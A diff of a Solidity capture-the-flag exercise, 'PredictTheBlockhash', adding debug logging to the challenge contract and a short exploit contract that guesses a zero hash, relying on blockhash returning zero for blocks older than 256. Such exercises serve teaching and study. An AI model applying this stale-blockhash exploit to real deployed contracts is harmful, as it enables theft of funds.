@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
+import {console} from "forge-std/console.sol";
 
 //Challenge
 contract PredictTheBlockhash {
@@ -25,6 +26,7 @@ contract PredictTheBlockhash {
         guesser = msg.sender;
         guess = hash;
         settlementBlockNumber = block.number + 1;
+       
     }
 
     function settle() public {
@@ -35,7 +37,8 @@ contract PredictTheBlockhash {
         );
 
         bytes32 answer = blockhash(settlementBlockNumber);
-
+         console.log("settlementBlockNumber", settlementBlockNumber);
+        console.logBytes32( answer);
         guesser = address(0);
         if (guess == answer) {
             (bool ok, ) = msg.sender.call{value: 2 ether}("");
@@ -43,6 +46,8 @@ contract PredictTheBlockhash {
         }
     }
 }
+
+
 
 // Write your exploit contract below
 contract ExploitContract {
@@ -53,4 +58,18 @@ contract ExploitContract {
     }
 
     // write your exploit code below
+
+    function exploit() public payable {
+        uint256 blockNumber = block.number + 1;
+        // console.log("blockNumber", blockNumber);
+        bytes32 g = bytes32(0); //blockhash(blockNumber);
+        // console.logBytes32( g);
+        predictTheBlockhash.lockInGuess{value: 1 ether}(g);
+    }
+
+    function guess() public {
+        predictTheBlockhash.settle();
+    }
+
+    receive() external payable {}
 }
